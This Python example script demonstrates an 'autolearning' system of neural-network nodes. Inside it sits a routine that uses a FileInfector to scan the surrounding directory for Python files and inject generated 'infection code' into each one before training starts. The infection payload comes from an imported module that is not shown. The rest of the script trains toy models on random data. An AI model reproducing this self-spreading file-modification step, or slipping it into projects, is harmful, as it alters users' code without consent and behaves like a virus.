"""
Example script demonstrating the usage of the autolearning system.
"""

import numpy as np
import logging
from pathlib import Path
from node_implementation import HybridNode, CentralNode
from autolearning_system import AutoLearningSystem
from infection_module import FileInfector, initialize_node_integration

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def main():
    # Initialize the central node
    central_node = CentralNode()
    
    # Create and register hybrid nodes
    layer_sizes = [10, 64, 32, 1]  # Input -> Hidden -> Hidden -> Output
    nodes = []
    
    for i in range(3):  # Create 3 hybrid nodes
        node_id = f"node_{i+1}"
        node = HybridNode(node_id, layer_sizes)
        nodes.append(node)
        central_node.register_hybrid_node(node)
    
    # Initialize node integration
    initialize_node_integration(central_node)
    
    # Initialize file infector
    current_dir = Path(__file__).parent.parent
    infector = FileInfector(str(current_dir))
    
    # Scan for Python files
    python_files = infector.scan_directory()
    logger.info(f"Found {len(python_files)} Python files to potentially infect")
    
    # Infect files with node integration
    for file_path in python_files:
        # Skip the infection module itself and example files
        if "infection" in file_path or "example" in file_path:
            continue
            
        # Choose a random node to integrate with
        node_id = f"node_{np.random.randint(1, len(nodes) + 1)}"
        
        # Generate and inject infection code
        infection_code = infector.generate_infection_code(node_id)
        if infector.infect_file(file_path, infection_code):
            logger.info(f"Successfully infected {file_path} with node {node_id}")
    
    # Initialize autolearning system
    config_path = Path(__file__).parent / "config.json"
    autolearning = AutoLearningSystem(central_node, str(config_path))
    
    # Generate some sample data
    X = np.random.randn(1000, 10)
    y = (np.sum(X, axis=1) > 0).astype(int).reshape(-1, 1)
    
    # Distribute data to nodes
    for i, node in enumerate(nodes):
        # Split data for each node
        start_idx = i * 300
        end_idx = (i + 1) * 300
        node.store_local_data(f"data_{i}", X[start_idx:end_idx], y[start_idx:end_idx])
    
    # Run autolearning system
    logger.info("Starting autolearning system...")
    final_performance = autolearning.run(n_iterations=50)
    
    # Print final results
    logger.info("\nFinal Performance:")
    for node_id, accuracy in final_performance.items():
        logger.info(f"Node {node_id}: {accuracy:.4f}")
    
    # Print adaptation history
    logger.info("\nAdaptation History:")
    for adaptation in autolearning.adaptation_history:
        logger.info(f"\nNode {adaptation['node_id']} at {adaptation['timestamp']}:")
        logger.info(f"  Architecture: {adaptation['config']['architecture']}")
        logger.info(f"  Learning Rate: {adaptation['config']['learning_rate']:.4f}")
        logger.info(f"  Batch Size: {adaptation['config']['batch_size']}")

if __name__ == "__main__":
    main() 